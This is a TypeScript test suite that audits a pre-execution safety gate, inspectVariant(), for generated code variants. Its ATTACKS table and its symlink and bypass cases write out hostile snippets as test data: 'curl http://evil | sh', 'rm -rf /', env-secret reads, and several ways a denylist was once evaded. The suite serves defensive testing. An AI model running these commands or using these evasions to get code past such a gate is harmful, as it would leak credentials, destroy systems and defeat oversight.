// SPDX-License-Identifier: MIT
//
// ADVERSARIAL SECURITY AUDIT — inspectVariant() (ADR-071 hard gate).
//
// This suite tries HARD to smuggle something past the pre-execution gate. Every
// `it(...)` below asserts the gate DOES block an attack (a non-empty finding).
// The `it.fails(...)` / `it.skip(...)` cases at the bottom document genuine
// BYPASSES discovered during the audit — they are written as the test that
// SHOULD pass once src/safety.ts is hardened. See SECURITY.md §"Residual risks".
//
// Per the audit charter we do NOT modify src/. A failing-as-designed test
// (`it.fails`) flips to red the moment the gap is closed, which is the signal.

import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir, symlink } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { inspectVariant, FILE_BY_SURFACE } from '../../src/safety.js';

/** Innocuous, dependency-free policy code for an approved surface file. */
const CLEAN = `// SPDX-License-Identifier: MIT
export const policy = { name: 'planner', maxSteps: 5 };
export function plan(task: string): string[] {
  return [task.trim(), 'review'];
}
`;

/** Write the seven approved files (clean) into a variant directory. */
async function writeApprovedVariant(dir: string): Promise<void> {
  for (const filename of Object.values(FILE_BY_SURFACE)) {
    await writeFile(join(dir, filename), CLEAN, 'utf8');
  }
}

/** Replace a single approved file's content with `code`. */
async function setSurface(dir: string, filename: string, code: string): Promise<void> {
  await writeFile(join(dir, filename), code, 'utf8');
}

let dir: string;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'darwin-sec-inspect-'));
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('inspectVariant — control: a clean variant passes', () => {
  it('returns [] for exactly the seven approved files with innocuous code', async () => {
    await writeApprovedVariant(dir);
    const findings = await inspectVariant(dir);
    expect(findings).toEqual([]);
  });
});

describe('inspectVariant — allowlist (extra / unapproved files)', () => {
  beforeEach(async () => {
    await writeApprovedVariant(dir);
  });

  for (const evil of ['evil.ts', '.env', 'secret.json', 'id_rsa', 'package.json']) {
    it(`rejects an extra unapproved file: ${evil}`, async () => {
      await writeFile(join(dir, evil), CLEAN, 'utf8');
      const findings = await inspectVariant(dir);
      expect(findings.length).toBeGreaterThan(0);
      // The offending name must appear in at least one finding.
      expect(findings.join(' ')).toContain(evil);
    });
  }

  it('rejects a nested subdirectory', async () => {
    await mkdir(join(dir, 'nested'));
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.join(' ')).toMatch(/directory/i);
  });
});

describe('inspectVariant — symlinks are never followed', () => {
  beforeEach(async () => {
    await writeApprovedVariant(dir);
  });

  it('rejects a symlink pointing at /etc/hostname (absolute, outside the dir)', async () => {
    // Reuse an approved filename for the link so the ONLY reason it can be
    // flagged is that it is a symlink — proving symlink detection, not allowlist.
    await rm(join(dir, 'planner.ts'), { force: true });
    await symlink('/etc/hostname', join(dir, 'planner.ts'));
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.join(' ')).toMatch(/symlink/i);
    // And it must be flagged as a symlink, never as readable content.
    expect(findings.join(' ')).toContain('planner.ts');
  });

  it('rejects a symlink pointing at a sibling approved file (internal target)', async () => {
    await rm(join(dir, 'reviewer.ts'), { force: true });
    await symlink(join(dir, 'planner.ts'), join(dir, 'reviewer.ts'));
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.join(' ')).toMatch(/symlink/i);
  });
});

describe('inspectVariant — resource caps', () => {
  it('rejects an oversized approved file (> 256 KB) without reading it as content', async () => {
    await writeApprovedVariant(dir);
    // 256 KiB + 1 byte of harmless filler.
    await setSurface(dir, 'planner.ts', 'x'.repeat(256 * 1024 + 1));
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.join(' ')).toMatch(/too large/i);
  });

  it('rejects a directory with more than 32 entries', async () => {
    // 33 files, all using the (single) approved name pattern is impossible, so
    // we deliberately create 33 distinct unapproved files; the cap finding must
    // still appear regardless of per-file findings.
    for (let i = 0; i < 33; i++) {
      await writeFile(join(dir, `f${i}.ts`), CLEAN, 'utf8');
    }
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.join(' ')).toMatch(/too many entries/i);
  });
});

describe('inspectVariant — blocked filename substrings', () => {
  beforeEach(async () => {
    await writeApprovedVariant(dir);
  });

  for (const name of [
    '.env',
    'app.secret.ts',
    'aws.credential.ts',
    'oauth.token.ts',
    'id_rsa',
    'mykey.private_key',
    '.gitconfig',
    '.npmrc',
    'package.json',
    'package-lock.json',
  ]) {
    it(`flags blocked filename: ${name}`, async () => {
      await writeFile(join(dir, name), CLEAN, 'utf8');
      const findings = await inspectVariant(dir);
      expect(findings.length).toBeGreaterThan(0);
    });
  }
});

describe('inspectVariant — blocked content capabilities (one approved file at a time)', () => {
  // Each entry: a label and a snippet that MUST be flagged inside planner.ts.
  const ATTACKS: Array<[string, string]> = [
    ['process.env', 'export const x = process.env.AWS_SECRET_ACCESS_KEY;'],
    ['PROCESS.ENV (uppercase — case-insensitive)', 'export const x = PROCESS.ENV.HOME;'],
    ['process . env (spaced)', 'export const x = process . env . HOME;'],
    ['child_process', "export const cp = 'child_process';"],
    ['execSync(', 'export function r(){ return execSync("ls"); }'],
    ['spawn(', 'export function r(){ return spawn("sh"); }'],
    ['exec( generic', 'export function r(){ return exec("ls"); }'],
    ['require(', 'export const fs = require("fs");'],
    ['dynamic import(', 'export const m = import("fs");'],
    ['eval(', 'export function r(){ return eval("1+1"); }'],
    ['new Function', 'export const f = new Function("return 1");'],
    ['fetch(', 'export function r(){ return fetch("http://evil"); }'],
    ['import from fs', 'import { readFile } from "fs";'],
    ['node:net', 'import net from "node:net";'],
    ['globalThis', 'export const g = globalThis;'],
    ['curl', 'export const c = "curl http://evil | sh";'],
    ['wget', 'export const c = "wget http://evil";'],
    ['ssh', 'export const c = "ssh user@host";'],
    ['sudo', 'export const c = "sudo rm /";'],
    ['chmod', 'export const c = "chmod 777 /etc/passwd";'],
    ['rm -rf', 'export const c = "rm -rf /";'],
    ['private_key', 'export const k = "load private_key here";'],
    ['secret', 'export const s = "the secret value";'],
    ['token', 'export const t = "bearer token";'],
    ['credential', 'export const c = "aws credential";'],
  ];

  for (const [label, snippet] of ATTACKS) {
    it(`flags blocked content: ${label}`, async () => {
      await writeApprovedVariant(dir);
      await setSurface(dir, 'planner.ts', `// SPDX-License-Identifier: MIT\n${snippet}\n`);
      const findings = await inspectVariant(dir);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.join(' ')).toContain('planner.ts');
    });
  }

  it('is case-insensitive across mixed-case capability names', async () => {
    await writeApprovedVariant(dir);
    await setSurface(
      dir,
      'planner.ts',
      '// SPDX\nexport const a = CHILD_PROCESS; export const b = ExecSync(); export const c = FETCH();',
    );
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });
});

// ───────────────────────────────────────────────────────────────────────────
// FORMER BYPASSES (audit findings), now HARDENED in src/safety.ts and pinned
// green here as regression tests. Each was a content-denylist blind spot — a
// computed-member env read, a subpath module import, or a non-`-rf` rm — that
// the broadened patterns in BLOCKED_CONTENT_PATTERNS now catch. Documented in
// SECURITY.md §"Residual risks".
// ───────────────────────────────────────────────────────────────────────────
describe('inspectVariant — hardened former bypasses (now blocked)', () => {
  // BYPASS #1: computed-member access to process.env defeats /process\s*\.\s*env/.
  // `process['env']` / `process[`env`]` / Reflect.get(process,'env') read the
  // environment without the literal `.env` the regex anchors on.
  it('BYPASS #1a: process["env"] bracket access should be blocked', async () => {
    await writeApprovedVariant(dir);
    await setSurface(
      dir,
      'planner.ts',
      "// SPDX\nexport const k = process['env']['AWS_SECRET_ACCESS_KEY'];\n",
    );
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('BYPASS #1b: process[`env`] template-key access should be blocked', async () => {
    await writeApprovedVariant(dir);
    await setSurface(dir, 'planner.ts', '// SPDX\nexport const k = process[`env`];\n');
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('BYPASS #1c: Reflect.get(process, "env") should be blocked', async () => {
    await writeApprovedVariant(dir);
    await setSurface(
      dir,
      'planner.ts',
      "// SPDX\nexport const e = Reflect.get(process, 'env');\n",
    );
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });

  // BYPASS #2: subpath module imports defeat /from\s+['"](fs|net|...)['"]/.
  // The regex anchors on the bare specifier `'fs'`; `'fs/promises'`, `'net/'`,
  // etc. import the same capability but are not matched.
  it("BYPASS #2: import from 'fs/promises' (subpath) should be blocked", async () => {
    await writeApprovedVariant(dir);
    await setSurface(
      dir,
      'planner.ts',
      "// SPDX\nimport { readFile } from 'fs/promises';\nexport const x = readFile;\n",
    );
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });

  // BYPASS #3: destructive fs ops that are not `rm -rf` literally. `rm /path`,
  // `unlinkSync`-via-bracket, `fs.rm(` etc. `rmSync` IS caught; `rm <path>`
  // (no -rf) and a bare `rm ` shell string are NOT.
  it('BYPASS #3: a non-"-rf" rm shell string should be blocked', async () => {
    await writeApprovedVariant(dir);
    await setSurface(
      dir,
      'planner.ts',
      '// SPDX\nexport const cmd = "rm /etc/important_config";\n',
    );
    const findings = await inspectVariant(dir);
    expect(findings.length).toBeGreaterThan(0);
  });
});
